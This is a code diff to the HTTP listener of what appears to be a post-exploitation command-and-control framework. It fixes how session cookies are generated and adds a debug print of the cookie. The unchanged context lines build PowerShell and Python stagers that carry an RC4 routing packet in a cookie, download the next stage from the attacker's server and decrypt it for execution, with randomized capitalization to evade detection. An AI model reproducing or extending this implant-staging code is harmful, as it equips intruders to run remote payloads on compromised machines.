@@ -165,6 +165,7 @@ class Listener:
 
         self.session_cookie = ''
 
+        # check if the current session cookie not empty and then generate random cookie
         if self.session_cookie == '':
             self.options['Cookie']['Value'] = self.generate_cookie()
 
@@ -281,8 +282,15 @@ class Listener:
             stage0 = random.choice(uris)
             customHeaders = profile.split('|')[2:]
 
-            #if self.session_cookie == '':
-            cookie = listenerOptions['Cookie']['Value']  
+            cookie = listenerOptions['Cookie']['Value']
+
+            # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
+            if cookie == '':
+                generate = self.generate_cookie()
+                listenerOptions['Cookie']['Value'] = generate
+                cookie = generate
+
+            print helpers.color(cookie,color="red")  
 
             if language.startswith('po'):
                 # PowerShell
@@ -405,7 +413,7 @@ class Listener:
 
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization("$wc.Headers.Add(")
-                stager += "\"Cookie\",\"%s\");" % (cookie + "=" + b64RoutingPacket)
+                stager += "\"Cookie\",\"%s=%s\");" % (cookie, b64RoutingPacket)
                 
                 stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
@@ -458,7 +466,7 @@ class Listener:
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (self.session_cookie,b64RoutingPacket)
+                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie,b64RoutingPacket)
 
                 # Add custom headers if any
                 if customHeaders != []:
